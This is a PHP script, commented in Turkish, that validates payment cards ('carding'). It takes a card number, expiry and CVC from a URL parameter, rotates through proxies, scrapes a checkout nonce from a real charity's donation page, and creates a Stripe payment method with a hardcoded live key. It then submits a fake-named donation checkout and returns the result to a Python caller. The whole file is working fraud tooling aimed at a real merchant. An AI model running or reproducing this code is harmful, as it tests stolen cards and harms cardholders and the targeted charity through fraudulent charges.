
<?php
error_reporting(0);
header('Content-Type: application/json');

// 1. KART BİLGİSİNİ AL
$cc = $_GET['cc'] ?? '';
if (empty($cc)) {
    echo json_encode(["status" => "error", "message" => "No CC provided"]);
    exit;
}

// 2. KART PARÇALAMA
$parts = explode('|', $cc);
$n = $parts[0]; $m = $parts[1]; $y = $parts[2]; $c = $parts[3];

// 3. PROXY SEÇİMİ (GitHub'daki proxy.txt'den çeker)
$proxy_auth = null;
$proxy_url = null;
if (file_exists('proxy.txt')) {
    $proxies = file("proxy.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!empty($proxies)) {
        $randomProxy = $proxies[array_rand($proxies)];
        $p = explode(':', $randomProxy);
        if (count($p) == 4) {
            $proxy_url = $p[0].':'.$p[1];
            $proxy_auth = $p[2].':'.$p[3];
        } else {
            $proxy_url = $randomProxy;
        }
    }
}

// 4. CURL FONKSİYONU
function request($url, $post = null, $proxy = null, $auth = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    
    // Render için kritik çerez yolu
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');

    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        if ($auth) curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth);
    }
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    return curl_exec($ch);
}

// --- İŞLEM BAŞLADI ---

// Adım 1: Bağış sayfasından Nonce al
$page = request("https://forcesforchange.org/donate/", null, $proxy_url, $proxy_auth);
preg_match('/name="woocommerce-process-checkout-nonce" value="([^"]+)"/', $page, $nonce);

// Adım 2: Stripe Payment Method ID (pm_id) oluştur
$pk = "pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrKfWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6";
$stripe_data = "type=card&card[number]=$n&card[cvc]=$c&card[exp_month]=$m&card[exp_year]=$y&key=$pk";
$stripe_res = request("https://api.stripe.com/v1/payment_methods", $stripe_data, $proxy_url, $proxy_auth);
$stripe_json = json_decode($stripe_res, true);
$pm_id = $stripe_json['id'] ?? null;

if (!$pm_id) {
    echo $stripe_res; // Stripe hata verirse direkt göster
    exit;
}

// Adım 3: Checkout (Ödeme) İşlemi
$checkout_data = http_build_query([
    'billing_first_name' => 'James',
    'billing_last_name' => 'Wilson',
    'billing_email' => 'test'.rand(100,999).'@gmail.com',
    'billing_country' => 'US',
    'payment_method' => 'stripe',
    'wc-stripe-payment-method' => $pm_id,
    'woocommerce-process-checkout-nonce' => $nonce[1] ?? '',
    '_wp_http_referer' => '/donate/'
]);

$final_res = request("https://forcesforchange.org/?wc-ajax=checkout", $checkout_data, $proxy_url, $proxy_auth);

// Yanıtı ekrana bas (Python bunu okuyacak)
echo $final_res;
?>
